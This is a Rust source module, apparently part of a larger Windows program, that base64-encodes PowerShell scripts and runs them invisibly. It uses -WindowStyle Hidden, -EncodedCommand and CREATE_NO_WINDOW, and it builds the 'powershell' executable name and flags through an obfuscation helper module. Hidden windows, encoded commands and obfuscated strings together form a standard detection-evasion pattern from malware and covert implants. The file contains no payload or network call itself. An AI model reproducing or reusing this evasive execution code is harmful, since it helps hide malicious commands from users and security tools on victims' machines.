use base64::{engine::general_purpose, Engine};
use std::process::Command;
use std::os::windows::process::CommandExt;

const CREATE_NO_WINDOW: u32 = 0x08000000;

pub fn encode_ps(script: &str) -> String {
    let utf16: Vec<u8> = script
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    
    general_purpose::STANDARD.encode(&utf16)
}

pub fn run_encoded(script: &str) -> std::io::Result<std::process::Output> {
    use crate::utils::obfuscate::{exe, powershell as ps};
    
    let encoded = encode_ps(script);
    
    Command::new(exe::powershell())
        .args(&[
            &ps::no_profile(),
            &ps::non_interactive(),
            &ps::window_style(),
            &ps::hidden(),
            &ps::encoded_command(),
            &encoded,
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
}

pub fn run_encoded_string(script: &str) -> anyhow::Result<String> {
    let output = run_encoded(script)?;
    
    if output.status.success() {
        Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        anyhow::bail!("PowerShell error: {}", stderr)
    }
}

